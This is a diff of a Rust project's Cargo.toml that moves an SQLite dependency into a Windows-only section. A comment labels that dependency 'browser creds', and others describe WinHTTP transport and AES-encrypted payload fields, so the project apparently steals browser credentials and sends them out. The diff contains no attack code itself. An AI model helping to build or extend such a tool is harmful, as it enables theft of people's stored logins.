@@ -20,7 +20,10 @@ codegen-units = 1
 strip = true
 panic = "abort"
 
-[dependencies]
+[target.'cfg(target_os = "windows")'.dependencies]
+# SQLite (bundled: compiles sqlite3.c from source, no system lib needed — browser creds)
+rusqlite = { version = "0.31", features = ["bundled"] }
+
 # Windows APIs: WinHTTP transport + BCryptGenRandom for nonce generation
 windows-sys = { version = "0.52", features = [
     "Win32_Foundation",
@@ -46,6 +49,7 @@ windows-sys = { version = "0.52", features = [
     "Win32_System_Console",
 ] }
 
+[dependencies]
 # Pure-Rust AES-256-GCM — no external C deps, cross-compiles cleanly from Linux
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
 
@@ -54,6 +58,3 @@ serde_json = "1"
 
 # Base64 for aes_key and payload fields
 base64 = "0.22"
-
-# SQLite (bundled: compiles sqlite3.c from source, no system lib needed)
-rusqlite = { version = "0.31", features = ["bundled"] }
